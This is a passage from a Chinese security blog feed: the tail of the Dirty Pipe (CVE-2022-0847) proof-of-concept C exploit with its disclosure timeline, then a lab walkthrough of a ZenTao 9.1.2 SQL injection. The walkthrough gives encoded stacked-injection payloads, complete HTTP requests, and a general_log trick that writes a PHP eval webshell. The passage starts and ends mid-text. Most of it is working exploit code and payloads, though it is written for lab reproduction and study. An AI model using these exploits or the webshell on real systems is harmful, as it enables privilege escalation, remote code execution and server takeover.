class="hljs-params">(<span class="hljs-keyword">int</span> argc, <span class="hljs-keyword">char</span> **argv)</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-keyword">if</span> (argc != <span class="hljs-number">4</span>) &#123;<br><span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">&quot;Usage: %s TARGETFILE OFFSET DATA\n&quot;</span>, argv[<span class="hljs-number">0</span>]);<br><span class="hljs-keyword">return</span> EXIT_FAILURE;<br>&#125;<br><br><span class="hljs-comment">/* dumb command-line argument parser */</span><br><span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> *<span class="hljs-keyword">const</span> path = argv[<span class="hljs-number">1</span>];<br><span class="hljs-keyword">loff_t</span> offset = <span class="hljs-built_in">strtoul</span>(argv[<span class="hljs-number">2</span>], <span class="hljs-literal">NULL</span>, <span class="hljs-number">0</span>);<br><span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> *<span class="hljs-keyword">const</span> data = argv[<span class="hljs-number">3</span>];<br><span class="hljs-keyword">const</span> <span class="hljs-keyword">size_t</span> data_size = <span class="hljs-built_in">strlen</span>(data);<br><br><span class="hljs-keyword">if</span> (offset % PAGE_SIZE == <span class="hljs-number">0</span>) &#123;<br><span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">&quot;Sorry, cannot start writing at a page boundary\n&quot;</span>);<br><span class="hljs-keyword">return</span> EXIT_FAILURE;<br>&#125;<br><br><span class="hljs-keyword">const</span> <span class="hljs-keyword">loff_t</span> next_page = (offset | (PAGE_SIZE - <span class="hljs-number">1</span>)) + <span class="hljs-number">1</span>;<br><span class="hljs-keyword">const</span> <span class="hljs-keyword">loff_t</span> end_offset = offset + (<span class="hljs-keyword">loff_t</span>)data_size;<br><span class="hljs-keyword">if</span> (end_offset &gt; next_page) &#123;<br><span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">&quot;Sorry, cannot write across a page boundary\n&quot;</span>);<br><span class="hljs-keyword">return</span> EXIT_FAILURE;<br>&#125;<br><br><span class="hljs-comment">/* open the input file and validate the specified offset */</span><br><span class="hljs-keyword">const</span> <span class="hljs-keyword">int</span> fd = <span class="hljs-built_in">open</span>(path, O_RDONLY); <span class="hljs-comment">// yes, read-only! :-)</span><br><span class="hljs-keyword">if</span> (fd &lt; <span class="hljs-number">0</span>) &#123;<br><span class="hljs-built_in">perror</span>(<span class="hljs-string">&quot;open failed&quot;</span>);<br><span class="hljs-keyword">return</span> EXIT_FAILURE;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">stat</span> <span class="hljs-title">st</span>;</span><br><span class="hljs-keyword">if</span> (<span class="hljs-built_in">fstat</span>(fd, &amp;st)) &#123;<br><span class="hljs-built_in">perror</span>(<span class="hljs-string">&quot;stat failed&quot;</span>);<br><span class="hljs-keyword">return</span> EXIT_FAILURE;<br>&#125;<br><br><span class="hljs-keyword">if</span> (offset &gt; st.st_size) &#123;<br><span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">&quot;Offset is not inside the file\n&quot;</span>);<br><span class="hljs-keyword">return</span> EXIT_FAILURE;<br>&#125;<br><br><span class="hljs-keyword">if</span> (end_offset &gt; st.st_size) &#123;<br><span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">&quot;Sorry, cannot enlarge the file\n&quot;</span>);<br><span class="hljs-keyword">return</span> EXIT_FAILURE;<br>&#125;<br><br><span class="hljs-comment">/* create the pipe with all flags initialized with</span><br><span class="hljs-comment">   PIPE_BUF_FLAG_CAN_MERGE */</span><br><span class="hljs-keyword">int</span> p[<span class="hljs-number">2</span>];<br><span class="hljs-built_in">prepare_pipe</span>(p);<br><br><span class="hljs-comment">/* splice one byte from before the specified offset into the</span><br><span class="hljs-comment">   pipe; this will add a reference to the page cache, but</span><br><span class="hljs-comment">   since copy_page_to_iter_pipe() does not initialize the</span><br><span class="hljs-comment">   &quot;flags&quot;, PIPE_BUF_FLAG_CAN_MERGE is still set */</span><br>--offset;<br><span class="hljs-keyword">ssize_t</span> nbytes = <span class="hljs-built_in">splice</span>(fd, &amp;offset, p[<span class="hljs-number">1</span>], <span class="hljs-literal">NULL</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>);<br><span class="hljs-keyword">if</span> (nbytes &lt; <span class="hljs-number">0</span>) &#123;<br><span class="hljs-built_in">perror</span>(<span class="hljs-string">&quot;splice failed&quot;</span>);<br><span class="hljs-keyword">return</span> EXIT_FAILURE;<br>&#125;<br><span class="hljs-keyword">if</span> (nbytes == <span class="hljs-number">0</span>) &#123;<br><span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">&quot;short splice\n&quot;</span>);<br><span class="hljs-keyword">return</span> EXIT_FAILURE;<br>&#125;<br><br><span class="hljs-comment">/* the following write will not create a new pipe_buffer, but</span><br><span class="hljs-comment">   will instead write into the page cache, because of the</span><br><span class="hljs-comment">   PIPE_BUF_FLAG_CAN_MERGE flag */</span><br>nbytes = <span class="hljs-built_in">write</span>(p[<span class="hljs-number">1</span>], data, data_size);<br><span class="hljs-keyword">if</span> (nbytes &lt; <span class="hljs-number">0</span>) &#123;<br><span class="hljs-built_in">perror</span>(<span class="hljs-string">&quot;write failed&quot;</span>);<br><span class="hljs-keyword">return</span> EXIT_FAILURE;<br>&#125;<br><span class="hljs-keyword">if</span> ((<span class="hljs-keyword">size_t</span>)nbytes &lt; data_size) &#123;<br><span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">&quot;short write\n&quot;</span>);<br><span class="hljs-keyword">return</span> EXIT_FAILURE;<br>&#125;<br><br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;It worked!\n&quot;</span>);<br><span class="hljs-keyword">return</span> EXIT_SUCCESS;<br>&#125;<br></code></pre></td></tr></table></figure></li></ol><h1 id="Timeline"><a href="#Timeline" class="headerlink" title="Timeline"></a>Timeline</h1><ul><li>2021-04-29: 收到第一封关于文件损坏的工单</li><li>2022-02-19: 文件损坏问题被确定为Linux内核错误，这是一个可利用的漏洞</li><li>2022-02-20: 向Linux内核安全团队发送<a href="https://www.kernel.org/doc/html/latest/admin-guide/security-bugs.html">错误报告、漏洞攻击和补丁</a></li><li>2022-02-21: 谷歌Pixel 6上重现的漏洞；发送给安卓安全团队的错误报告</li><li>2022-02-21: 按照Linus Torvalds、Willy Tarreau和Al Viro的建议，将补丁发送给<a href="https://lore.kernel.org/lkml/20220221100313.1504449-1-max.kellermann@ionos.com/">LKML（无漏洞详细信息）</a></li><li>2022-02-23: Linux稳定版修复了我的漏洞（<a href="https://lore.kernel.org/stable/1645618039140207@kroah.com/">5.16.11</a>、<a href="https://lore.kernel.org/stable/164561803311588@kroah.com/">5.15.25</a>、<a href="https://lore.kernel.org/stable/164561802556115@kroah.com/">5.10.102</a>）</li><li>2022-02-24: 谷歌将我的漏洞修复程序合并到<a href="https://android-review.googlesource.com/c/kernel/common/+/1998671">Android内核</a>中</li><li>2022-02-28: 通知<a href="https://oss-security.openwall.org/wiki/mailing-lists/distros#how-to-use-the-lists">linux发行版邮件</a></li><li>2022-03-07: 公开披露列表</li></ul>]]></content>
    
    
    <categories>
      
      <category>文档翻译</category>
      
    </categories>
    
    
    <tags>
      
      <tag>文档翻译</tag>
      
      <tag>CVE-2022-0847</tag>
      
      <tag>Dirty Pipe提权漏洞</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>禅道zentaopms-9.1.2-sql SQL注入</title>
    <link href="/2022/03/12/zentaopms_9.1.2_sql_SQL%E6%B3%A8%E5%85%A5/"/>
    <url>/2022/03/12/zentaopms_9.1.2_sql_SQL%E6%B3%A8%E5%85%A5/</url>
    
    <content type="html"><![CDATA[<h1 id="复现"><a href="#复现" class="headerlink" title="复现"></a>复现</h1><h2 id="漏洞详情"><a href="#漏洞详情" class="headerlink" title="漏洞详情"></a>漏洞详情</h2><p><em>禅道 项目管理软件 是国产的开源项目管理软件,专注研发项目管理,内置需求管理、任务管理、bug管理、缺陷管理、用例管理、计划发布等功能,实现了软件的完整生命周期管理。 漏洞出现在zentao\lib\base\dao\dao.class.php中的orderBy函数没有对limit部分做任何限制就直接拼接。也就是说，使用了orderBy这个函数的地方都有可能产生过滤。</em></p><h2 id="漏洞环境"><a href="#漏洞环境" class="headerlink" title="漏洞环境"></a>漏洞环境</h2><p>该漏洞环境已整合到vulfocus靶场中，可一键直接启动。 </p><p><img src="https://cdn.jsdelivr.net/gh/corp0ra1/BlogPhoto/newBlogPhoto/zentaopms_9.1.2_sql_SQL%E6%B3%A8%E5%85%A5/Untitled.png" alt="Untitled"></p><h2 id="复现过程"><a href="#复现过程" class="headerlink" title="复现过程"></a>复现过程</h2><ol><li>获取目标版本信息：<a href="http://118.193.36.37:10363/zentaopms/www/index.php?mode=getconfig">http://118.193.36.37:10363/zentaopms/www/index.php?mode=getconfig</a><ol><li>{“version”:”9.1.2”,”requestType”:”GET”,”requestFix”:”-………………</li></ol></li><li>通过错误路由引发报错，进而获取服务器绝对路径：<a href="http://118.193.36.37:10363/zentaopms/www/index.php?m=user&amp;f=login1">http://118.193.36.37:10363/zentaopms/www/index.php?m=user&amp;f=login1</a><ol><li>/www/zentaopms/framework/base/router.class.php</li></ol></li><li>漏洞点：orderBy处理过程中存在SQL注入问题，可堆叠注入。拿其中一个payload演示编码步骤如下：<ol><li>选择所用payload语句：<code>select sleep(5)</code></li><li>将SQL语句hex编码：<code>0x73656c65637420736c656570283529</code></li><li>将hex编码后的参数插入json中：<code>&#123;&quot;orderBy&quot;:&quot;order limit 1;SET @SQL=0x73656c65637420736c656570283529;PREPARE pord FROM @SQL;EXECUTE pord;-- -&quot;,&quot;num&quot;:&quot;1,1&quot;,&quot;type&quot;:&quot;openedbyme&quot;&#125;</code></li><li>将json数据进行base64编码：<code>eyJvcmRlckJ5Ijoib3JkZXIgbGltaXQgMTtTRVQgQFNRTD0weDczNjU2YzY1NjM3NDIwNzM2YzY1NjU3MDI4MzUyOTtQUkVQQVJFIHBvcmQgRlJPTSBAU1FMO0VYRUNVVEUgcG9yZDstLSAtIiwibnVtIjoiMSwxIiwidHlwZSI6Im9wZW5lZGJ5bWUifQ==</code></li><li>将base64编码后的数据插入请求：<a href="http://118.193.36.37:10363/zentaopms/www/index.php%EF%BC%9Fm=block&amp;f=main&amp;mode=getblockdata&amp;blockid=case&amp;param=eyJvcmRlckJ5Ijoib3JkZXIgbGltaXQgMTtTRVQgQFNRTD0weDczNjU2YzY1NjM3NDIwNzM2YzY1NjU3MDI4MzUyOTtQUkVQQVJFIHBvcmQgRlJPTSBAU1FMO0VYRUNVVEUgcG9yZDstLSAtIiwibnVtIjoiMSwxIiwidHlwZSI6Im9wZW5lZGJ5bWUifQ==">http://118.193.36.37:10363/zentaopms/www/index.php%EF%BC%9Fm=block&amp;f=main&amp;mode=getblockdata&amp;blockid=case&amp;param=eyJvcmRlckJ5Ijoib3JkZXIgbGltaXQgMTtTRVQgQFNRTD0weDczNjU2YzY1NjM3NDIwNzM2YzY1NjU3MDI4MzUyOTtQUkVQQVJFIHBvcmQgRlJPTSBAU1FMO0VYRUNVVEUgcG9yZDstLSAtIiwibnVtIjoiMSwxIiwidHlwZSI6Im9wZW5lZGJ5bWUifQ==</a></li><li>注：每一个请求中都需要手动添加refer字段：<code>Referer:http://118.193.36.37:10363/zentaopms/</code></li></ol></li><li>获取webshell过程的payload如下：（采用的是日志写shell的方式）<ol><li>开启日志：<code>set global general_log=&#39;on&#39;;</code> </li><li>更改日志路径：<code>set global general_log_file=&#39;/www/zentaopms/module/misc/ext/model/foo.php&#39;;</code> </li><li>注入shell语句：<code>select &#39;&lt;?php @eval($_POST[1])?&gt;&#39;;</code> </li><li>关闭日志:<code>set global general_log=&#39;off&#39;;</code></li></ol></li><li>访问webshell获取flag：链接：<a href="http://118.193.36.37:10363/zentaopms/module/misc/ext/model/foo.php">http://118.193.36.37:10363/zentaopms/module/misc/ext/model/foo.php</a> 密码：1</li></ol><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">//sleep（5）</span><br>GET /zentaopms/www/index.php?m=block&amp;f=main&amp;mode=getblockdata&amp;blockid=<span class="hljs-keyword">case</span>&amp;param=eyJvcmRlckJ5Ijoib3JkZXIgbGltaXQgMTtTRVQgQFNRTD0weDczNjU2YzY1NjM3NDIwNzM2YzY1NjU3MDI4MzUyOTtQUkVQQVJFIHBvcmQgRlJPTSBAU1FMO0VYRUNVVEUgcG9yZDstLSAtIiwibnVtIjoiMSwxIiwidHlwZSI6Im9wZW5lZGJ5bWUifQ== HTTP/<span class="hljs-number">1.1</span><br>Host: <span class="hljs-number">118.193</span>.<span class="hljs-number">36.37</span>:<span class="hljs-number">10363</span><br>Referer:http:<span class="hljs-comment">//118.193.36.37:10363/zentaopms/</span><br><br><span class="hljs-comment">//开启日志：set global general_log=&#x27;on&#x27;; </span><br>GET /zentaopms/www/index.php?m=block&amp;f=main&amp;mode=getblockdata&amp;blockid=<span class="hljs-keyword">case</span>&amp;param=eyJvcmRlckJ5Ijoib3JkZXIgbGltaXQgMSwxO1NFVCBAU1FMPTB4NzM2NTc0MjA2NzZjNmY2MjYxNmMyMDY3NjU2ZTY1NzI2MTZjNWY2YzZmNjczZDI3NmY2ZTI3M2I7UFJFUEFSRSBwb3JkIEZST00gQFNRTDtFWEVDVVRFIHBvcmQ7LS0gLSIsIm51bSI6IjEsMSIsInR5cGUiOiJvcGVuZWRieW1lIn0= HTTP/<span class="hljs-number">1.1</span><br>Host: <span class="hljs-number">118.193</span>.<span class="hljs-number">36.37</span>:<span class="hljs-number">10363</span><br>Referer:http:<span class="hljs-comment">//118.193.36.37:10363/zentaopms/</span><br><br><span class="hljs-comment">//更改日志路径：set global general_log_file=&#x27;/www/zentaopms/module/misc/ext/model/foo.php&#x27;; </span><br>GET /zentaopms/www/index.php?m=block&amp;f=main&amp;mode=getblockdata&amp;blockid=<span class="hljs-keyword">case</span>&amp;param=eyJvcmRlckJ5Ijoib3JkZXIgbGltaXQgMSwxO1NFVCBAU1FMPTB4NzM2NTc0MjA2NzZjNmY2MjYxNmMyMDY3NjU2ZTY1NzI2MTZjNWY2YzZmNjc1ZjY2Njk2YzY1M2QyNzJmNzc3Nzc3MmY3YTY1NmU3NDYxNmY3MDZkNzMyZjZkNmY2NDc1NmM2NTJmNmQ2OTczNjMyZjY1Nzg3NDJmNmQ2ZjY0NjU2YzJmNjY2ZjZmMmU3MDY4NzAyNzNiO1BSRVBBUkUgcG9yZCBGUk9NIEBTUUw7RVhFQ1VURSBwb3JkOy0tIC0iLCJudW0iOiIxLDEiLCJ0eXBlIjoib3BlbmVkYnltZSJ9 HTTP/<span class="hljs-number">1.1</span><br>Host: <span class="hljs-number">118.193</span>.<span class="hljs-number">36.37</span>:<span class="hljs-number">10363</span><br>Referer:http:<span class="hljs-comment">//118.193.36.37:10363/zentaopms/</span><br><br><span class="hljs-comment">//注入shell语句：select &#x27;<span class="hljs-meta">&lt;?php</span> @eval($_POST[1])<span class="hljs-meta">?&gt;</span>&#x27;;</span><br>GET /zentaopms/www/index.php?m=block&amp;f=main&amp;mode=getblockdata&amp;blockid=<span class="hljs-keyword">case</span>&amp;param=eyJvcmRlckJ5Ijoib3JkZXIgbGltaXQgMSwxO1NFVCBAU1FMPTB4NzM2NTZjNjU2Mzc0MjAyNzNjM2Y3MDY4NzAyMDQwNjU3NjYxNmMyODI0NWY1MDRmNTM1NDViMzE1ZDI5M2YzZTI3M2I7UFJFUEFSRSBwb3JkIEZST00gQFNRTDtFWEVDVVRFIHBvcmQ7LS0gLSIsIm51bSI6IjEsMSIsInR5cGUiOiJvcGVuZWRieW1lIn0= HTTP/<span class="hljs-number">1.1</span><br>Host: <span class="hljs-number">118.193</span>.<span class="hljs-number">36.37</span>:<span class="hljs-number">10363</span><br>Referer:http:<span class="hljs-comment">//118.193.36.37:10363/zentaopms/</span><br><br><span class="hljs-comment">//关闭日志:set global general_log=&#x27;off&#x27;;</span><br>GET /zentaopms/www/index.php?m=block&amp;f=main&amp;mode=getblockdata&amp;blockid=<span class="hljs-keyword">case</span>&amp;param=eyJvcmRlckJ5Ijoib3JkZXIgbGltaXQgMSwxO1NFVCBAU1FMPTB4NzM2NTc0MjA2NzZjNmY2MjYxNmMyMDY3NjU2ZTY1NzI2MTZjNWY2YzZmNjczZDI3NmY2NjY2MjczYjtQUkVQQVJFIHBvcmQgRlJPTSBAU1FMO0VYRUNVVEUgcG9yZDstLSAtIiwibnVtIjoiMSwxIiwidHlwZSI6Im9wZW5lZGJ5bWUifQ== HTTP/<span class="hljs-number">1.1</span><br>Host: <span class="hljs-number">118.193</span>.<span class="hljs-number">36.37</span>:<span class="hljs-number">10363</span><br>Referer:http:<span class="hljs-comment">//118.193.36.37:10363/zentaopms/</span><br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/corp0ra1/BlogPhoto/newBlogPhoto/zentaopms_9.1.2_sql_SQL%E6%B3%A8%E5%85%A5/Untitled%201.png" alt="Untitled"></p><h2 id="简单描述"><a href="#简单描述" class="headerlink" title="简单描述"></a>简单描述</h2><ol><li>为什么不用select…into file方式getshell？网上教程绝大部分用这种方式，但是此靶场不行，详见后文select …into file处</li><li>为什么用哪个foo.php路径？因为只有特定的文件路径可以。详见后文general_log处的坑一坑二</li><li>为什么用预处理方式？系统有过滤一些敏感符号，预处理中可利用hex编码绕过，详见补充部分</li><li>为什么请求中一定要加refer？系统有校验这个请求头，详见补充部分</li></ol><h1 id="详细讲讲TL-DR"><a href="#详细讲讲TL-DR" class="headerlink" title="详细讲讲TL;DR"></a>详细讲讲TL;DR</h1><p>由于在线 Vulfocus的靶机存在时间限制，故选择自行搭建靶机。同时由于自行搭建，故可以进入靶机然后分析。</p><h2 id="搭建环境"><a href="#搭建环境" class="headerlink" title="搭建环境"></a>搭建环境</h2><ol><li>拉取官方镜像：<code>sudo docker pull vulfocus/zentaopms_9.1.2_sql</code></li><li>启动：<code>sudo docker run -dt --name zentao -p 8080:80 vulfocus/zentaopms_9.1.2_sql</code></li><li>访问：<code>IP+8080+/zentaopms/www/index.php</code></li><li>后台管理员账户：<code>admin/zxc@123</code></li></ol><h3 id="后文会用到的命令"><a href="#后文会用到的命令" class="headerlink" title="后文会用到的命令"></a>后文会用到的命令</h3><ol><li>进行docker内：<code>sudo docker exec -it xxxx /bin/bash</code></li><li>进入mysql：<code>mysql -u root -p</code>  。账户密码： <code>root/pass</code>,账户密码存于<code>/www/zentaopms/config/my.php</code></li><li>mysql命令：<ol><li>查看安全：<code>show variables like &#39;%secure%&#39;;</code></li><li>查看日志：<code>show variables like &#39;general_log%&#39;;</code></li><li>设置日志路径：<code>set global general_log_file=&#39;/var/lib/mysql/ac2ecb1e75dc.log&#39;;</code></li><li>设置日志开启：<code>set global general_log=&#39;on&#39;;</code></li></ol></li></ol><blockquote><p>trick: 由于payload要频繁base64编码，burpsuite中的trick：<code>Ctrl+B</code>→Base64编码，<code>Ctrl+Shift+B</code>→Base64解码</p></blockquote><h2 id="SELECT…INTO-OUTFILE方式失败"><a href="#SELECT…INTO-OUTFILE方式失败" class="headerlink" title="SELECT…INTO OUTFILE方式失败"></a>SELECT…INTO OUTFILE方式失败</h2><p>最早找到的文章<a href="https://www.freebuf.com/vuls/246678.html">《禅道免登陆SQL注入漏洞复现》</a>就是通过SELECT…INTO OUTFILE方式写入，但是发现怎么写入都不成功</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php">payload--&gt;select <span class="hljs-string">&#x27;&lt;?php @eval($_POST[1])?&gt;&#x27;</span> into outfile <span class="hljs-string">&#x27;/www/zentaopms/www/1.php&#x27;</span><br>hex--&gt;<span class="hljs-number">0x73656c65637420273c3f70687020406576616c28245f504f53545b315d293f3e2720696e746f206f757466696c6520272f7777772f7a656e74616f706d732f7777772f312e70687027</span><br>params--&gt;&#123;<span class="hljs-string">&quot;orderBy&quot;</span>:<span class="hljs-string">&quot;order limit 1;SET @SQL=0x73656c65637420273c3f70687020406576616c28245f504f53545b315d293f3e2720696e746f206f757466696c6520272f7777772f7a656e74616f706d732f7777772f312e70687027;PREPARE pord FROM @SQL;EXECUTE pord;-- -&quot;</span>,<span class="hljs-string">&quot;num&quot;</span>:<span class="hljs-string">&quot;1,1&quot;</span>,<span class="hljs-string">&quot;type&quot;</span>:<span class="hljs-string">&quot;openedbyme&quot;</span>&#125;<br>base64--&gt;eyJvcmRlckJ5Ijoib3JkZXIgbGltaXQgMTtTRVQgQFNRTD0weDczNjU2YzY1NjM3NDIwMjczYzNmNzA2ODcwMjA0MDY1NzY2MTZjMjgyNDVmNTA0ZjUzNTQ1YjMxNWQyOTNmM2UyNzIwNjk2ZTc0NmYyMDZmNzU3NDY2Njk2YzY1MjAyNzJmNzc3Nzc3MmY3YTY1NmU3NDYxNmY3MDZkNzMyZjc3Nzc3NzJmMzEyZTcwNjg3MDI3O1BSRVBBUkUgcG9yZCBGUk9NIEBTUUw7RVhFQ1VURSBwb3JkOy0tIC0iLCJudW0iOiIxLDEiLCJ0eXBlIjoib3BlbmVkYnltZSJ9<br></code></pre></td></tr></table></figure><h3 id="失败的原因"><a href="#失败的原因" class="headerlink" title="失败的原因"></a>失败的原因</h3><p><code>show variables like &#39;%secure%&#39;;</code>其中<code>secure_file_priv</code>会限制数据的导入导出操作。</p><p>（1）当<code>secure_file_priv</code>为空，就可以任意读取磁盘的目录。</p><p>（2）当<code>secure_file_priv</code>为path，就可以读取对应目录以及其子目录的文件。</p><p>（3）当<code>secure_file_priv</code>为null，不能加载文件。</p><p>故反馈到靶机上，查看下图，文件只能写入到<code>/var/lib/mysql-files</code>目录下。如将shell的写入路径改为<code>/var/lib/mysql-files/1.php</code>即可以写入shell，但是这种写入也只是鸡肋，无法利用</p><p>且<code>secure-file-priv</code>属于Server System Variables，无法通过SQL语句更改，只能通过更改系统配置文件的方式。故通过SELECT … INTO OUTFILE语句写入shell的方式在此靶机中行不通</p><p><img src="https://cdn.jsdelivr.net/gh/corp0ra1/BlogPhoto/newBlogPhoto/zentaopms_9.1.2_sql_SQL%E6%B3%A8%E5%85%A5/Untitled%202.png" alt="Untitled"></p><blockquote><p>trick：vulfocus的靶机提供了3306端口的对外映射，故可以直接链接</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/corp0ra1/BlogPhoto/newBlogPhoto/zentaopms_9.1.2_sql_SQL%E6%B3%A8%E5%85%A5/Untitled%203.png" alt="Untitled"></p><h2 id="sleep-验证漏洞存在"><a href="#sleep-验证漏洞存在" class="headerlink" title="sleep()验证漏洞存在"></a>sleep()验证漏洞存在</h2><blockquote><p>既然按照上述文章一把梭的方式失败，就只能最简单的<code>sleep()</code>开始验证漏洞存在，给自己点正面反馈</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/corp0ra1/BlogPhoto/newBlogPhoto/zentaopms_9.1.2_sql_SQL%E6%B3%A8%E5%85%A5/Untitled%204.png" alt="Untitled"></p><h2 id="报错尝试"><a href="#报错尝试" class="headerlink" title="报错尝试"></a>报错尝试</h2><blockquote><p>此处也是给自己的一个正反馈：延时盲注可行，写shell文件不行，于是尝试报错注入，看能否再给自己一个正反馈</p></blockquote><p>参考：L3m0n师傅<a href="https://zhuanlan.zhihu.com/p/34275981">《从SQL注入到Getshell：记一次禅道系统的渗透》</a> </p><p>构造:<code>&#123;&quot;orderBy&quot;:&quot;order limit 1&#39;&quot;,&quot;num&quot;:&quot;1,1&quot;,&quot;type&quot;:&quot;openedbyme&quot;&#125;</code> 其中1后面有个单引号，进而构成报错注入。很庆幸看到了报错信息，但遗憾无法根据报错进行注入。</p><p>关于为什么此处不用堆叠注入，L3m0n文中也提及：因为“limit后的注入点，因为使用多语句的话，报错效果不明显，所以就直接在limit后面进行注入”，而“limit的注入和mysql版本还有一些关系，目前网上的payload仅限于低版本才可报错注入出数据，很不幸运的是，目标使用的是高版本mysql”</p><p><img src="https://cdn.jsdelivr.net/gh/corp0ra1/BlogPhoto/newBlogPhoto/zentaopms_9.1.2_sql_SQL%E6%B3%A8%E5%85%A5/Untitled%205.png" alt="Untitled%205.png"></p><p><img src="https://cdn.jsdelivr.net/gh/corp0ra1/BlogPhoto/newBlogPhoto/zentaopms_9.1.2_sql_SQL%E6%B3%A8%E5%85%A5/Untitled%206.png" alt="Untitled"></p><p><img src="https://cdn.jsdelivr.net/gh/corp0ra1/BlogPhoto/newBlogPhoto/zentaopms_9.1.2_sql_SQL%E6%B3%A8%E5%85%A5/Untitled%207.png" alt="Untitled"></p><h2 id="general-log方式成功"><a href="#general-log方式成功" class="headerlink" title="general_log方式成功"></a>general_log方式成功</h2><p>general_log写入四部曲：</p><ol><li>开启日志：<code>set global general_log=&#39;on&#39;;</code> </li><li>更改日志路径：<code>set global general_log_file=&#39;/www/zentaopms/module/misc/ext/model/foo.php&#39;;</code> </li><li>注入shell语句：<code>select &#39;&lt;?php @eval($_POST[1])?&gt;&#39;;</code> </li><li>关闭日志:<code>set global general_log=&#39;off&#39;;</code></li></ol><p>注：我第四步选择关闭日志，因为实在不想所有的SQL语句都写入文件，进而导致shell文件过于冗杂</p><h3 id="坑一：mysql写入文件的权限问题"><a href="#坑一：mysql写入文件的权限问题" class="headerlink" title="坑一：mysql写入文件的权限问题"></a>坑一：mysql写入文件的权限问题</h3><p>我尝试随便写入文件到Web目录下，如<code>set global general_log_file=&#39;/www/zentaopms/www/test.php&#39;</code> ，但遗憾失败了，卡在了权限。</p><p>原因：执行SQL语句写入文件的是mysql用户，但是运行Web服务的是www-data用户</p><p><img src="https://cdn.jsdelivr.net/gh/corp0ra1/BlogPhoto/newBlogPhoto/zentaopms_9.1.2_sql_SQL%E6%B3%A8%E5%85%A5/Untitled%208.png" alt="Untitled%208.png"></p><h3 id="坑一解决方案"><a href="#坑一解决方案" class="headerlink" title="坑一解决方案"></a>坑一解决方案</h3><p>思路：找到一个mysql可以写入的,且www-data用户可以访问的php文件</p><p>方法：<code>find /www/zentaopms/ -perm 777 -type f</code>   </p><p>发现web目录下有这些文件可以写，初步排查一波，觉得<code>hello.test.php</code>可用</p><p><img src="https://cdn.jsdelivr.net/gh/corp0ra1/BlogPhoto/newBlogPhoto/zentaopms_9.1.2_sql_SQL%E6%B3%A8%E5%85%A5/Untitled%209.png" alt="Untitled"></p><h3 id="坑二：php标签闭合"><a href="#坑二：php标签闭合" class="headerlink" title="坑二：php标签闭合"></a>坑二：php标签闭合</h3><p><code>hello.test.php</code> 确实可以写入，web也确实可以访问，但是访问出错</p><p>我直接将写入的文件复制到本地环境访问，发现原因在于开启日志会写入一些信息，而这些信息不符合php语法故报错，即使是闭合了php标签。</p><p><img src="https://cdn.jsdelivr.net/gh/corp0ra1/BlogPhoto/newBlogPhoto/zentaopms_9.1.2_sql_SQL%E6%B3%A8%E5%85%A5/Untitled%2010.png" alt="Untitled%2010.png"></p><p><img src="https://cdn.jsdelivr.net/gh/corp0ra1/BlogPhoto/newBlogPhoto/zentaopms_9.1.2_sql_SQL%E6%B3%A8%E5%85%A5/Untitled%2011.png" alt="Untitled"></p><h3 id="坑二解决方案"><a href="#坑二解决方案" class="headerlink" title="坑二解决方案"></a>坑二解决方案</h3><p>继续再从上述权限为777类型的文件中找其他的闭合了标签的php文件，然后发现foo文件吻合。</p><p>故我的攻击路径采用的是<code>/www/zentaopms/module/misc/ext/model/foo.php</code> ，当然也有其他文件可以，但未每个尝试</p><blockquote><p>采用：<code>inurl:ext/model/foo.php</code> 语法进行搜索，疑似就是禅道默认都会有这个foo.php文件？未测试</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/corp0ra1/BlogPhoto/newBlogPhoto/zentaopms_9.1.2_sql_SQL%E6%B3%A8%E5%85%A5/Untitled%2012.png" alt="Untitled%2012.png"></p><p><img src="https://cdn.jsdelivr.net/gh/corp0ra1/BlogPhoto/newBlogPhoto/zentaopms_9.1.2_sql_SQL%E6%B3%A8%E5%85%A5/Untitled%2013.png" alt="Untitled%2013.png"></p><h1 id="补充"><a href="#补充" class="headerlink" title="补充"></a>补充</h1><h2 id="为什么要加refer字段"><a href="#为什么要加refer字段" class="headerlink" title="为什么要加refer字段"></a>为什么要加refer字段</h2><p>参考L3m0n师傅的文章，在9.1.2也就是靶场环境的/www/zentaopms/module/block/control.php文件中，在“*__construct中，$this-&gt;selfCall是在验证referer的值，如果为真的话则后面的if将不会进入die语句里面*”</p><p><img src="https://cdn.jsdelivr.net/gh/corp0ra1/BlogPhoto/newBlogPhoto/zentaopms_9.1.2_sql_SQL%E6%B3%A8%E5%85%A5/Untitled%2014.png" alt="Untitled"></p><h2 id="为什么用预处理"><a href="#为什么用预处理" class="headerlink" title="为什么用预处理"></a>为什么用预处理</h2><p>堆叠普通SQL语句，如<code>&#123;&quot;orderBy&quot;:&quot;order limit 1;select sleep(5)-- 